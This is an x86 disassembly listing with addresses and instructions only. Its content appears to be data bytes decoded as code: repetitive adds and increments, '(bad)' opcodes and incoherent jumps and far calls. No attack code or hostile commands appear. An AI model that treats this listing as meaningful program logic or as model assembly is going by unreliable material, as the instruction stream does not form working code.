  443919:	xor    edi,edi
  44391b:	sbb    eax,0x11ff581c
  443920:	cmp    esi,esp
  443922:	inc    DWORD PTR [ecx]
  443924:	pop    es
  443925:	in     al,0xff
  443927:	add    BYTE PTR [eax],al
  443929:	cmp    edi,0xff4e0000
  44392f:	add    BYTE PTR [eax],al
  443931:	daa    
  443932:	inc    DWORD PTR [eax]
  443934:	add    BYTE PTR [eax],dl
  443936:	inc    DWORD PTR [eax]
  443938:	add    BYTE PTR [edx],cl
  44393a:	inc    DWORD PTR [eax]
  44393c:	add    BYTE PTR [esi],al
  44393e:	inc    DWORD PTR [eax]
  443940:	add    BYTE PTR ds:0x40000ff,al
  443946:	inc    DWORD PTR [eax]
  443948:	add    BYTE PTR [edi+edi*8],al
  44394b:	add    BYTE PTR [eax],al
  44394d:	add    al,0xff
  44394f:	add    BYTE PTR [eax],al
  443951:	or     bh,bh
  443953:	add    BYTE PTR [eax],al
  443955:	adc    eax,0x2f0000ff
  44395a:	inc    DWORD PTR [eax]
  44395c:	add    BYTE PTR [edi-0x1],dl
  44395f:	add    BYTE PTR [eax],al
  443961:	mov    ?,edi
  443963:	adc    DWORD PTR [edx],edx
  443965:	call   FWORD PTR fs:[eax]
  443968:	sbb    BYTE PTR [ebx],ah
  44396a:	call   DWORD PTR [ecx]
  44396c:	sbb    BYTE PTR [ecx-0x1],dl
  44396f:	adc    dl,BYTE PTR [edi]
  443971:	push   eax
  443972:	dec    DWORD PTR [ecx*1+0x160eff3e]
  443979:	inc    edi
  44397a:	dec    DWORD PTR [eax+edx*1]
  44397d:	cmp    edi,edi
  44397f:	or     al,0xe
  443981:	inc    edx
  443982:	dec    DWORD PTR [edx]
  443984:	or     eax,0xb06ff45
  443989:	xchg   bh,bh
  44398b:	or     BYTE PTR [eax+ebx*2],cl
  44398e:	inc    DWORD PTR [esi+ecx*1]
  443991:	mov    dl,0xff
  443993:	add    BYTE PTR [ecx+edx*8],al
  443996:	inc    DWORD PTR [eax]
  443998:	add    al,al
  44399a:	inc    DWORD PTR [eax]
  44399c:	add    ebp,ecx
  44399e:	inc    DWORD PTR [eax]
  4439a0:	or     al,0xfa
  4439a2:	jmp    DWORD PTR [eax]
  4439a4:	and    eax,0x1b23ffba
  4439a9:	cmp    edi,0x15
  4439ac:	or     al,0xc0
  4439ae:	inc    DWORD PTR [eax]
  4439b0:	add    cl,dl
  4439b2:	inc    DWORD PTR [eax]
  4439b4:	add    dh,ch
  4439b6:	inc    DWORD PTR [eax]
  4439b8:	add    BYTE PTR [ebp-0x7affff01],ah
  4439be:	inc    DWORD PTR [eax]
  4439c0:	add    BYTE PTR [ebp-0x1],dh
  4439c3:	add    BYTE PTR [eax],al
  4439c5:	ins    BYTE PTR es:[edi],dx
  4439c6:	inc    DWORD PTR [eax]
  4439c8:	add    BYTE PTR [ecx-0x1],ch
  4439cb:	add    BYTE PTR [eax],al
  4439cd:	inc    WORD PTR [eax]
  4439d0:	add    BYTE PTR [edi-0x1],bl
  4439d3:	add    BYTE PTR [eax],al
  4439d5:	push   ebp
  4439d6:	inc    DWORD PTR [eax]
  4439d8:	add    BYTE PTR [edx-0x1],cl
  4439db:	add    BYTE PTR [eax],al
  4439dd:	inc    ecx
  4439de:	inc    DWORD PTR [eax]
  4439e0:	add    BYTE PTR [esi],bh
  4439e2:	inc    DWORD PTR [eax]
  4439e4:	add    BYTE PTR [edi+edi*8],bh
  4439e7:	add    BYTE PTR [eax],al
  4439e9:	cmp    eax,0x400000ff
  4439ee:	inc    DWORD PTR [eax]
  4439f0:	add    BYTE PTR [esi-0x1],al
  4439f3:	add    BYTE PTR [eax],al
  4439f5:	dec    esi
  4439f6:	inc    DWORD PTR [eax]
  4439f8:	add    BYTE PTR [ecx-0x1],bl
  4439fb:	add    BYTE PTR [eax],al
  4439fd:	push   0xffffffff
  4439ff:	add    BYTE PTR [eax],al
  443a01:	jg     0x443a02
  443a03:	add    BYTE PTR [eax],al
  443a05:	call   0x10ff:0xb10302ff
  443a0c:	sbb    dh,BYTE PTR [ebx-0x1]
  443a0f:	adc    eax,0xaff5a24
  443a14:	adc    eax,0x1211ff3e
  443a19:	cmp    bh,bh
  443a1b:	sub    al,0x24
  443a1d:	dec    esi
  443a1e:	dec    DWORD PTR [edx]
  443a20:	adc    bl,BYTE PTR [ebx]
  443a22:	inc    DWORD PTR ds:0xffb416
  443a28:	add    DWORD PTR [edi+edi*8-0x9d0000],esi
  443a2f:	add    BYTE PTR [eax],al
  443a31:	cmp    bh,bh
  443a33:	add    BYTE PTR [eax],al
  443a35:	sbb    bh,bh
  443a37:	add    BYTE PTR [eax],al
  443a39:	or     edi,edi
  443a3b:	add    BYTE PTR [eax],al
  443a3d:	or     edi,edi
  443a3f:	add    BYTE PTR [eax],al
  443a41:	or     bh,bh
  443a43:	add    BYTE PTR [eax],al
  443a45:	or     al,0xff
  443a47:	add    BYTE PTR [eax],al
  443a49:	push   cs
  443a4a:	inc    DWORD PTR [eax]
  443a4c:	add    BYTE PTR [edi],cl
  443a4e:	inc    DWORD PTR [eax]
  443a50:	add    BYTE PTR [edi],cl
  443a52:	inc    DWORD PTR [eax]
  443a54:	add    BYTE PTR [edi+edi*8],cl
  443a57:	add    BYTE PTR [eax],al
  443a59:	or     bh,bh
  443a5b:	add    BYTE PTR [eax],al
  443a5d:	or     edi,edi
  443a5f:	add    BYTE PTR [eax],al
  443a61:	or     al,0xff
  443a63:	add    BYTE PTR [eax],al
  443a65:	push   cs
  443a66:	inc    DWORD PTR [eax]
  443a68:	add    BYTE PTR [esi],bl
  443a6a:	inc    DWORD PTR [eax]
  443a6c:	add    BYTE PTR [edx],bh
  443a6e:	inc    DWORD PTR [eax]
  443a70:	add    BYTE PTR [edi+edi*8+0x0],ah
  443a74:	add    DWORD PTR [edi+edi*8-0x16ef00],esp
  443a7b:	add    eax,0xffcc10
  443a80:	add    DWORD PTR [ebx-0x1cffff01],edx
  443a86:	dec    DWORD PTR [eax]
  443a88:	or     bl,BYTE PTR [ebx-0x1]
  443a8b:	and    BYTE PTR [ebx],bl
  443a8d:	and    edi,edi
  443a8f:	movhps QWORD PTR [edx-0x1],xmm3
  443a93:	and    BYTE PTR ds:0x201dff43,bl
  443a99:	cmp    bh,bh
  443a9b:	or     eax,0xbff3e15
  443aa0:	sbb    BYTE PTR [edi],ch
  443aa2:	jmp    FWORD PTR [ebx+eax*2]
  443aa5:	jo     0x443aa6
  443aa7:	adc    DWORD PTR [edi+edi*8],esp
  443aaa:	inc    DWORD PTR [eax]
  443aac:	add    dh,dl
  443aae:	inc    DWORD PTR [eax]
  443ab0:	add    BYTE PTR [edi-0x78ffff01],dh
  443ab6:	inc    DWORD PTR [eax]
  443ab8:	add    BYTE PTR [esi-0x1],ch
  443abb:	add    BYTE PTR [eax],al
  443abd:	pop    esp
  443abe:	inc    DWORD PTR [eax]
  443ac0:	add    BYTE PTR [eax-0x1],dl
  443ac3:	add    BYTE PTR [eax],al
  443ac5:	push   edx
  443ac6:	inc    DWORD PTR [eax]
  443ac8:	add    BYTE PTR [ecx-0x1],bl
  443acb:	add    BYTE PTR [eax],al
  443acd:	imul   edi,edi,0x0
  443ad0:	add    BYTE PTR [esi-0x22fdff01],cl
  443ad6:	inc    DWORD PTR [eax]
  443ad8:	add    dl,bh
  443ada:	inc    DWORD PTR [edi]
  443adc:	or     BYTE PTR [edi+edi*8-0xe5f3fa],al
  443ae3:	or     ecx,DWORD PTR [esi]
  443ae5:	adc    edi,edi
  443ae7:	push   cs
  443ae8:	adc    DWORD PTR [edi+edi*8+0x11],eax
  443aec:	sbb    DWORD PTR [ebp-0x1],ebp
  443aef:	or     cl,BYTE PTR [esi]
  443af1:	dec    edx
  443af2:	dec    DWORD PTR [edx]
  443af4:	push   cs
  443af5:	mov    bh,bh
  443af7:	adc    eax,0x1cff3018
  443afc:	and    DWORD PTR ds:0x7b1916ff,ebp
  443b02:	inc    DWORD PTR [eax]
  443b04:	add    bl,ch
  443b06:	inc    DWORD PTR [eax]
  443b08:	add    ch,dl
  443b0a:	inc    DWORD PTR [eax]
  443b0c:	add    al,al
  443b0e:	inc    DWORD PTR [eax]
  443b10:	adc    ah,al
  443b12:	call   FWORD PTR [esi+ebx*1]
  443b15:	dec    ebx
  443b16:	call   FWORD PTR [ecx]
  443b18:	sbb    bh,BYTE PTR [edx]
  443b1a:	call   DWORD PTR [edi+ebx*1]
  443b1d:	xchg   edi,eax
  443b1e:	inc    DWORD PTR [ecx]
  443b20:	or     eax,0x201fffe
  443b25:	lods   al,BYTE PTR ds:[esi]
  443b26:	inc    DWORD PTR [eax]
  443b28:	add    BYTE PTR [ecx-0x1],ch
  443b2b:	add    BYTE PTR [eax],al
  443b2d:	cmp    al,0xff
  443b2f:	add    BYTE PTR [eax],al
  443b31:	pop    ds
  443b32:	inc    DWORD PTR [eax]
  443b34:	add    BYTE PTR ds:0x60000ff,cl
  443b3a:	inc    DWORD PTR [eax]
  443b3c:	add    BYTE PTR [esi],al
  443b3e:	inc    DWORD PTR [eax]
  443b40:	add    BYTE PTR [ebx],al
  443b42:	inc    DWORD PTR [eax]
  443b44:	add    BYTE PTR [ebx],al
  443b46:	inc    DWORD PTR [eax]
  443b48:	add    BYTE PTR [edi+edi*8],al
  443b4b:	add    BYTE PTR [eax],al
  443b4d:	add    al,0xff
  443b4f:	add    BYTE PTR [eax],al
  443b51:	add    eax,0xe0000ff
  443b56:	inc    DWORD PTR [eax]
  443b58:	add    BYTE PTR [edx],ah
  443b5a:	inc    DWORD PTR [eax]
  443b5c:	add    BYTE PTR [ebp-0x1],al
  443b5f:	add    BYTE PTR [eax],al
  443b61:	jb     0x443b62
  443b63:	add    eax,DWORD PTR [esi]
  443b65:	retf   0x18ff
  443b68:	pop    ss
  443b69:	cmp    al,0xff
  443b6b:	adc    al,0x17
  443b6d:	sub    al,0xff
  443b6f:	adc    eax,0xeff511c
  443b74:	adc    eax,0xf0bff2d
  443b79:	and    edi,edi
  443b7b:	push   es
  443b7c:	or     BYTE PTR [ebp-0x1],bl
  443b7f:	add    eax,DWORD PTR [edx+edx*4]
  443b82:	inc    DWORD PTR [eax]
  443b84:	add    dl,cl
  443b86:	inc    DWORD PTR [eax]
  443b88:	add    ah,ch
  443b8a:	inc    DWORD PTR [edx]
  443b8c:	adc    edi,esp
  443b8e:	inc    DWORD PTR [eax]
  443b90:	add    eax,0x200ffd4
  443b95:	retf   
  443b96:	inc    DWORD PTR [ecx]
  443b98:	push   cs
  443b99:	icebp  
  443b9a:	inc    DWORD PTR ds:0x1dffed13
  443ba0:	and    DWORD PTR [edi-0x1],ebp
  443ba3:	xor    ebp,DWORD PTR [esi]
  443ba5:	xor    eax,0x432c32ff
  443baa:	push   DWORD PTR ds:0x2fff3a2e
  443bb0:	and    eax,0x1317ff69
  443bb5:	scas   al,BYTE PTR es:[edi]
  443bb6:	inc    DWORD PTR [eax]
  443bb8:	push   es
  443bb9:	int3   
  443bba:	inc    DWORD PTR [eax]
  443bbc:	add    BYTE PTR [edi+edi*8-0x320000],dh
  443bc3:	add    BYTE PTR [eax],al
  443bc5:	(bad)  
  443bc6:	inc    DWORD PTR [eax]
  443bc8:	add    dh,dl
  443bca:	inc    DWORD PTR [eax]
  443bcc:	add    BYTE PTR [ebx-0x6affff01],ch
  443bd2:	inc    DWORD PTR [eax]
  443bd4:	add    BYTE PTR [edx+0x7d0000ff],cl
  443bda:	inc    DWORD PTR [eax]
  443bdc:	add    BYTE PTR [edx-0x1],dh
  443bdf:	add    BYTE PTR [eax],al
  443be1:	push   0xffffffff
  443be3:	add    BYTE PTR [eax],al
  443be5:	inc    WORD PTR [eax]
  443be8:	add    BYTE PTR [eax-0x1],ch
  443beb:	add    BYTE PTR [eax],al
  443bed:	ins    DWORD PTR es:[edi],dx
  443bee:	inc    DWORD PTR [eax]
  443bf0:	add    BYTE PTR [ebp-0x1],dh
  443bf3:	add    BYTE PTR [eax],al
  443bf5:	cmp    bh,0x0
  443bf8:	add    BYTE PTR [esi-0x5bffff01],cl
  443bfe:	inc    DWORD PTR [eax]
  443c00:	add    al,0xcc
  443c02:	inc    DWORD PTR [edi+ecx*1]
  443c05:	sar    bh,0x15
  443c08:	sbb    DWORD PTR [edi],edi
  443c0a:	call   DWORD PTR [ecx]
  443c0c:	sbb    al,BYTE PTR [ecx-0x1]
  443c0f:	or     al,0x18
  443c11:	inc    edi
  443c12:	dec    DWORD PTR ds:0x1aff4518
  443c18:	adc    al,0x32
  443c1a:	jmp    FWORD PTR [edx]
  443c1c:	push   ds
  443c1d:	cmp    edi,edi
  443c1f:	or     DWORD PTR [esi],ecx
  443c21:	ud0    eax,DWORD PTR [ebx]
  443c24:	pop    ss
  443c25:	retf   0xff
  443c28:	add    eax,edx
  443c2a:	inc    DWORD PTR [eax]
  443c2c:	add    BYTE PTR [eax-0x1],ch
  443c2f:	add    BYTE PTR [eax],al
  443c31:	cmp    edi,edi
  443c33:	add    BYTE PTR [eax],al
  443c35:	sbb    edi,edi
  443c37:	add    BYTE PTR [eax],al
  443c39:	or     bh,bh
  443c3b:	add    BYTE PTR [eax],al
  443c3d:	or     al,0xff
  443c3f:	add    BYTE PTR [eax],al
  443c41:	or     edi,edi
  443c43:	add    BYTE PTR [eax],al
  443c45:	or     edi,edi
  443c47:	add    BYTE PTR [eax],al
  443c49:	or     edi,edi
  443c4b:	add    BYTE PTR [eax],al
  443c4d:	or     edi,edi
  443c4f:	add    BYTE PTR [eax],al
  443c51:	or     eax,0xa0000ff
  443c56:	inc    DWORD PTR [eax]
  443c58:	add    BYTE PTR [ecx],cl
  443c5a:	inc    DWORD PTR [eax]
  443c5c:	add    BYTE PTR [ecx],cl
  443c5e:	inc    DWORD PTR [eax]
  443c60:	add    BYTE PTR [edx],cl
  443c62:	inc    DWORD PTR [eax]
  443c64:	add    BYTE PTR [edi+edi*8],cl
  443c67:	add    BYTE PTR [eax],al
  443c69:	sbb    edi,edi
  443c6b:	add    BYTE PTR [eax],al
  443c6d:	cmp    bh,bh
  443c6f:	add    BYTE PTR [eax],al
  443c71:	inc    DWORD PTR [bx+di]
  443c74:	add    DWORD PTR [edi+edi*8-0x17f1fe],esp
  443c7b:	add    BYTE PTR [esi+ecx*8],cl
  443c7e:	inc    DWORD PTR [ebx]
  443c80:	pop    es
  443c81:	sar    bh,0x8
  443c84:	or     bl,BYTE PTR [edx-0x58f0ea01]
  443c8a:	call   DWORD PTR [edi]
  443c8c:	adc    cl,BYTE PTR [edi+edi*8]
  443c8f:	sbb    bl,BYTE PTR [esi]
  443c91:	aaa    
  443c92:	call   FWORD PTR [edi]
  443c94:	sbb    DWORD PTR [ecx-0x1],edx
  443c97:	es daa 
  443c99:	inc    ebp
  443c9a:	jmp    DWORD PTR ds:0x11ff3324
  443ca0:	sbb    BYTE PTR [edi+edi*8+0xa],cl
  443ca4:	and    esi,edx
  443ca6:	inc    DWORD PTR ds:0xffe317
  443cac:	add    dh,cl
  443cae:	inc    DWORD PTR [eax]
  443cb0:	add    BYTE PTR [edi+edi*8-0x620000],dh
  443cb7:	add    BYTE PTR [ecx],al
  443cb9:	xchg   ecx,eax
  443cba:	inc    DWORD PTR [eax]
  443cbc:	add    DWORD PTR [ebp-0x78fdff01],ecx
  443cc2:	inc    DWORD PTR [eax]
  443cc4:	add    ah,BYTE PTR [ebp-0x70ffff01]
  443cca:	inc    DWORD PTR [eax]
  443ccc:	add    BYTE PTR [esi-0x42feff01],dl
  443cd2:	inc    DWORD PTR [eax]
  443cd4:	pop    es
  443cd5:	out    0xff,eax
  443cd7:	add    BYTE PTR [eax],al
  443cd9:	(bad)  
  443cdc:	adc    DWORD PTR [ebx-0x1],esp
  443cdf:	or     al,0x14
  443ce1:	and    bh,bh
  443ce3:	push   cs
  443ce4:	adc    DWORD PTR [edi+edi*8],esp
  443ce7:	adc    dl,BYTE PTR ds:0xd09ff2a
  443ced:	sub    eax,0x1d090bff
  443cf2:	dec    DWORD PTR [ecx]
  443cf4:	or     eax,0x1a13ff9c
  443cf9:	dec    edx
  443cfa:	call   DWORD PTR [esi]
  443cfc:	sbb    DWORD PTR [edi+edi*8],edi
  443cff:	push   ds
  443d00:	and    DWORD PTR [edi],esp
  443d02:	inc    DWORD PTR [esi]
  443d04:	pop    es
  443d05:	int3   
  443d06:	inc    DWORD PTR [eax]
  443d08:	add    bh,dl
  443d0a:	inc    DWORD PTR [eax]
  443d0c:	add    al,al
  443d0e:	inc    DWORD PTR [eax]
  443d10:	add    al,al
  443d12:	dec    DWORD PTR [esi]
  443d14:	adc    DWORD PTR [esi-0x1],esi
  443d17:	sbb    BYTE PTR [esi],bl
  443d19:	pusha  
  443d1a:	dec    DWORD PTR [edx]
  443d1c:	adc    BYTE PTR [edx-0x24feff01],bh
  443d22:	inc    DWORD PTR [eax]
  443d24:	add    BYTE PTR [esi-0x1],bh
  443d27:	add    BYTE PTR [eax],al
  443d29:	push   ecx
  443d2a:	inc    DWORD PTR [eax]
  443d2c:	add    BYTE PTR ds:0x160000ff,ch
  443d32:	inc    DWORD PTR [eax]
  443d34:	add    BYTE PTR [edx],cl
  443d36:	inc    DWORD PTR [eax]
  443d38:	add    BYTE PTR ds:0x60000ff,al
  443d3e:	inc    DWORD PTR [eax]
  443d40:	add    BYTE PTR [edi+edi*8],al
  443d43:	add    BYTE PTR [eax],al
  443d45:	add    al,0xff
  443d47:	add    BYTE PTR [eax],al
  443d49:	add    bh,bh
  443d4b:	add    BYTE PTR [eax],al
  443d4d:	add    bh,bh
  443d4f:	add    BYTE PTR [eax],al
  443d51:	add    bh,bh
  443d53:	add    BYTE PTR [eax],al
  443d55:	push   es
  443d56:	inc    DWORD PTR [eax]
  443d58:	add    BYTE PTR ds:0x2e0000ff,dl
  443d5e:	inc    DWORD PTR [eax]
  443d60:	add    BYTE PTR [ebp-0x1],dl
  443d63:	add    BYTE PTR [ecx],al
  443d65:	(bad)  
  443d66:	inc    DWORD PTR [ebx+eax*1]
  443d69:	retf   0x17ff
  443d6c:	sub    BYTE PTR [edi+edi*8+0x13],dh
  443d70:	sbb    edx,DWORD PTR [eax]
  443d72:	dec    DWORD PTR [edx]
  443d74:	or     al,0x78
  443d76:	inc    DWORD PTR [edx]
  443d78:	add    cl,cl
  443d7a:	inc    DWORD PTR [eax]
  443d7c:	add    bl,ch
  443d7e:	inc    DWORD PTR [eax]
  443d80:	add    dl,cl
  443d82:	inc    DWORD PTR [eax]
  443d84:	add    ecx,edx
  443d86:	inc    DWORD PTR [eax]
  443d88:	or     ah,dh
  443d8a:	inc    DWORD PTR [ebx]
  443d8c:	or     esp,esp
  443d8e:	inc    DWORD PTR [eax]
  443d90:	or     esi,esp
  443d92:	inc    DWORD PTR [eax]
  443d94:	paddb  mm7,mm7
  443d97:	or     edx,DWORD PTR [edx]
  443d99:	mov    ch,0xff
  443d9b:	sbb    ebx,DWORD PTR [ebx]
  443d9d:	inc    esi
  443d9e:	jmp    DWORD PTR [eax]
  443da0:	pop    ds
  443da1:	xor    edi,edi
  443da3:	push   ds
  443da4:	sbb    ecx,DWORD PTR [edx-0x1]
  443da7:	and    BYTE PTR [edx],ah
  443da9:	inc    esp
  443daa:	jmp    DWORD PTR [ecx]
  443dac:	and    bh,BYTE PTR [edx]
  443dae:	jmp    DWORD PTR [esi]
  443db0:	and    eax,0x292bff32
  443db5:	xor    al,0xff
  443db7:	push   cs
  443db8:	sbb    ch,BYTE PTR [edi+edi*8-0x420000]
  443dbf:	add    al,0x3
  443dc1:	fdiv   st(7),st
  443dc3:	pop    es
  443dc4:	adc    al,0xe5
  443dc6:	inc    DWORD PTR [edx]
  443dc8:	pxor   mm7,mm7
  443dcb:	add    dl,BYTE PTR ds:0x400fffe
  443dd1:	in     eax,dx
  443dd2:	inc    DWORD PTR [eax]
  443dd4:	add    BYTE PTR [eax-0x63fdfe01],bh
  443dda:	inc    DWORD PTR [ecx]
  443ddc:	add    esp,DWORD PTR [ebp-0x5bfdff01]
  443de2:	inc    DWORD PTR [eax]
  443de4:	add    DWORD PTR [ebx-0x59ffff01],esp
  443dea:	inc    DWORD PTR [eax]
  443dec:	add    ch,BYTE PTR [edx-0x50fbfe01]
  443df2:	inc    DWORD PTR [eax]
  443df4:	add    BYTE PTR [eax-0x3bffff01],bh
  443dfa:	inc    DWORD PTR [eax]
  443dfc:	add    ah,ah
  443dfe:	dec    DWORD PTR ds:0x14ffae1b
  443e04:	push   ds
  443e05:	call   DWORD PTR es:[eax]
  443e08:	sbb    BYTE PTR [eax],bh
  443e0a:	call   DWORD PTR [eax]
  443e0c:	sbb    DWORD PTR [esi-0x1],edi
  443e0f:	sbb    al,0x20
  443e11:	aas    
  443e12:	call   FWORD PTR [edx]
  443e14:	and    al,0x6c
  443e16:	jmp    DWORD PTR [edx]
  443e18:	and    eax,0x212bff64
  443e1d:	dec    DWORD PTR ss:[eax]
  443e20:	or     eax,0x1608ff03
  443e25:	mov    ebp,0xbe0100ff
  443e2a:	inc    DWORD PTR [eax]
  443e2c:	add    BYTE PTR [eax-0x1],ah
  443e2f:	add    BYTE PTR [eax],al
  443e31:	xor    edi,edi
  443e33:	add    BYTE PTR [eax],al
  443e35:	adc    edi,edi
  443e37:	add    BYTE PTR [eax],al
  443e39:	add    edi,edi
  443e3b:	add    BYTE PTR [eax],al
  443e3d:	add    bh,bh
  443e3f:	add    BYTE PTR [eax],al
  443e41:	add    bh,bh
  443e43:	add    BYTE PTR [eax],al
  443e45:	add    bh,bh
  443e47:	add    BYTE PTR [eax],al
  443e49:	add    bh,bh
  443e4b:	add    BYTE PTR [eax],al
  443e4d:	add    bh,bh
  443e4f:	add    BYTE PTR [eax],al
  443e51:	add    bh,bh
  443e53:	add    BYTE PTR [eax],al
  443e55:	add    bh,bh
  443e57:	add    BYTE PTR [eax],al
  443e59:	add    bh,bh
  443e5b:	add    BYTE PTR [eax],al
  443e5d:	add    bh,bh
  443e5f:	add    BYTE PTR [eax],al
  443e61:	add    bh,bh
  443e63:	add    BYTE PTR [eax],al
  443e65:	add    al,0xff
  443e67:	add    BYTE PTR [eax],al
  443e69:	push   ss
  443e6a:	inc    DWORD PTR [eax]
  443e6c:	add    BYTE PTR [edi],dh
  443e6e:	inc    DWORD PTR [eax]
  443e70:	add    BYTE PTR [edi-0x1],ah
  443e73:	add    al,0x7
  443e75:	mov    ah,0xff
  443e77:	add    eax,0x9ffe218
  443e7c:	adc    al,0x71
  443e7e:	call   FWORD PTR [eax]
  443e80:	adc    DWORD PTR [ebx-0x1],ebp
  443e83:	das    
  443e84:	and    eax,0x100eff4e
  443e89:	sub    edi,edi
  443e8b:	adc    eax,0x28ff3314
  443e90:	and    eax,0x606ff39
  443e95:	xor    bh,bh
  443e97:	push   cs
  443e98:	adc    cl,BYTE PTR [edi-0x1]
  443e9b:	and    DWORD PTR ds:0x1007ff1a,ebx
  443ea1:	sar    bh,0x3
  443ea4:	push   cs
  443ea5:	(bad)  
  443ea6:	inc    DWORD PTR ds:0xffad0d
  443eac:	add    BYTE PTR [esi-0x41ffff01],bh
  443eb2:	inc    DWORD PTR [ecx]
  443eb4:	add    DWORD PTR [ebp-0x2ef1ff01],esi
  443eba:	inc    DWORD PTR [ebx]
  443ebc:	adc    ebp,ebp
  443ebe:	inc    DWORD PTR [eax]
  443ec0:	sbb    al,0xf9
  443ec2:	inc    DWORD PTR [eax]
  443ec4:	add    dl,dl
  443ec6:	inc    DWORD PTR [eax]
  443ec8:	add    dh,al
  443eca:	inc    DWORD PTR [eax]
  443ecc:	add    BYTE PTR [esi-0x26fdff01],bh
  443ed2:	inc    DWORD PTR [ecx]
  443ed4:	add    dl,bl
  443ed6:	inc    DWORD PTR [ecx]
  443ed8:	add    cl,BYTE PTR [ebx+0x25150eff]
  443ede:	dec    DWORD PTR [esi]
  443ee0:	adc    ch,BYTE PTR [edi+edi*8]
  443ee3:	adc    DWORD PTR [edi],ecx
  443ee5:	pop    ds
  443ee6:	call   DWORD PTR [eax]
  443ee8:	adc    bl,BYTE PTR [esi]
  443eea:	dec    DWORD PTR ds:0x9ff2d15
  443ef0:	or     edx,DWORD PTR [ecx]
  443ef2:	dec    DWORD PTR [esi+ecx*1]
  443ef5:	jno    0x443ef6
  443ef7:	movhps QWORD PTR [edx-0x1],xmm7
  443efb:	sbb    ah,BYTE PTR [ecx]
  443efd:	aaa    
  443efe:	jmp    DWORD PTR [eax]
  443f00:	and    DWORD PTR ds:0xa31413ff,esp
  443f06:	inc    DWORD PTR [eax]
  443f08:	add    bh,bl
  443f0a:	inc    DWORD PTR [eax]
  443f0c:	add    BYTE PTR [esi-0x49ffff01],bh
  443f12:	inc    DWORD PTR [esi+eax*1]
  443f15:	xchg   ebp,eax
  443f16:	inc    DWORD PTR [ebx]
  443f18:	adc    edi,edx
  443f1a:	inc    DWORD PTR [eax+ecx*1]
  443f1d:	jecxz  0x443f1e
  443f1f:	add    DWORD PTR [ebx],eax
  443f21:	cdq    
  443f22:	inc    DWORD PTR [eax]
  443f24:	add    BYTE PTR [edi+edi*8+0x0],bl
  443f28:	add    BYTE PTR [ecx],bh
  443f2a:	inc    DWORD PTR [eax]
  443f2c:	add    BYTE PTR [edi+edi*8],bl
  443f2f:	add    BYTE PTR [eax],al
  443f31:	or     edi,edi
  443f33:	add    BYTE PTR [eax],al
  443f35:	add    edi,edi
  443f37:	add    BYTE PTR [eax],al
  443f39:	add    bh,bh
  443f3b:	add    BYTE PTR [eax],al
  443f3d:	add    bh,bh
  443f3f:	add    BYTE PTR [eax],al
  443f41:	add    bh,bh
  443f43:	add    BYTE PTR [eax],al
  443f45:	add    bh,bh
  443f47:	add    BYTE PTR [eax],al
  443f49:	add    bh,bh
  443f4b:	add    BYTE PTR [eax],al
  443f4d:	add    bh,bh
  443f4f:	add    BYTE PTR [eax],al
  443f51:	add    bh,bh
  443f53:	add    BYTE PTR [eax],al
  443f55:	add    edi,edi
  443f57:	add    BYTE PTR [eax],al
  443f59:	or     eax,0x1e0000ff
  443f5e:	inc    DWORD PTR [eax]
  443f60:	add    BYTE PTR [edx],bh
  443f62:	inc    DWORD PTR [eax]
  443f64:	add    BYTE PTR [ecx-0x1],ah
  443f67:	add    BYTE PTR [eax],al
  443f69:	mov    al,0xff
  443f6b:	add    BYTE PTR [ebx*8-0x3affff01],al
  443f72:	inc    DWORD PTR [ecx]
  443f74:	add    bh,dl
  443f76:	inc    DWORD PTR [eax]
  443f78:	add    DWORD PTR [edi+edi*8-0x32ff00],edi
  443f7f:	add    BYTE PTR [eax],cl
  443f81:	jmp    0xeff:0xd60c02ff
  443f88:	adc    DWORD PTR [ecx-0x1],esp
  443f8b:	or     al,0x13
  443f8d:	popa   
  443f8e:	inc    DWORD PTR [edi]
  443f90:	adc    ah,BYTE PTR [edi+edi*8-0x71e8eb]
  443f97:	adc    eax,0x19ff4b15
  443f9c:	pop    ss
  443f9d:	sub    eax,0x501919ff
  443fa2:	call   FWORD PTR [ecx]
  443fa4:	sbb    BYTE PTR [edi],bh
  443fa6:	call   DWORD PTR [ecx+edx*1]
  443fa9:	xor    eax,0x34141aff
  443fae:	call   DWORD PTR [ecx]
  443fb0:	or     DWORD PTR ds:0x26161bff,esi
  443fb6:	call   FWORD PTR [esi+edx*1]
  443fb9:	inc    DWORD PTR fs:[eax]
  443fbc:	add    ah,al
  443fbe:	inc    DWORD PTR [edx+eax*1]
  443fc1:	sar    edi,1
  443fc3:	sbb    DWORD PTR [eax],ebx
  443fc5:	aaa    
  443fc6:	call   FWORD PTR [ecx]
  443fc8:	sbb    eax,0x170fff37
  443fcd:	ins    BYTE PTR es:[edi],dx
  443fce:	dec    DWORD PTR [edx]
  443fd0:	pop    ss
  443fd1:	sar    edi,0x5
  443fd4:	adc    eax,0x1603ffed
  443fd9:	out    dx,eax
  443fda:	inc    DWORD PTR [eax]
  443fdc:	or     ebp,edi
  443fde:	inc    DWORD PTR [eax]
  443fe0:	or     dh,cl
  443fe2:	inc    DWORD PTR [eax]
  443fe4:	push   cs
  443fe5:	hlt    
  443fe6:	inc    DWORD PTR [ebx]
  443fe8:	or     dh,bh
  443fea:	inc    DWORD PTR [eax]
  443fec:	or     edi,edx
  443fee:	inc    DWORD PTR [eax]
  443ff0:	add    ch,al
  443ff2:	inc    DWORD PTR [eax]
  443ff4:	add    dh,ah
  443ff6:	dec    DWORD PTR [ebx]
  443ff8:	bswap  esp
  443ffa:	call   FWORD PTR [eax]
  443ffc:	and    BYTE PTR [edi+edi*8],bh
  443fff:	adc    BYTE PTR [edx],ah
  444001:	push   ecx
  444002:	call   FWORD PTR [ecx]
  444004:	sub    ebx,DWORD PTR [esi-0x1]
  444007:	add    DWORD PTR ds:0x90cfff6,ebx
  44400d:	ins    DWORD PTR es:[edi],dx
  44400e:	call   FWORD PTR [ebx]
  444010:	push   ss
  444011:	adc    edi,edi
  444013:	push   ds
  444014:	daa    
  444015:	xchg   esp,eax
  444016:	call   DWORD PTR [eax+ebx*1]
  444019:	jo     0x44401a
  44401b:	or     al,0xb
  44401d:	inc    esi
  44401e:	inc    DWORD PTR [edi]
  444020:	or     DWORD PTR [edi+edi*8],eax
  444023:	or     BYTE PTR [eax],bl
  444025:	mov    dh,0xff
  444027:	add    BYTE PTR [ebx],al
  444029:	(bad)  
  44402a:	inc    DWORD PTR [eax]
  44402c:	add    BYTE PTR [edx-0x1],ah
  44402f:	add    BYTE PTR [eax],al
  444031:	xor    bh,bh
  444033:	add    BYTE PTR [eax],al
  444035:	adc    edi,edi
  444037:	add    BYTE PTR [eax],al
  444039:	add    bh,bh
  44403b:	add    BYTE PTR [eax],al
  44403d:	add    bh,bh
  44403f:	add    BYTE PTR [eax],al
  444041:	add    bh,bh
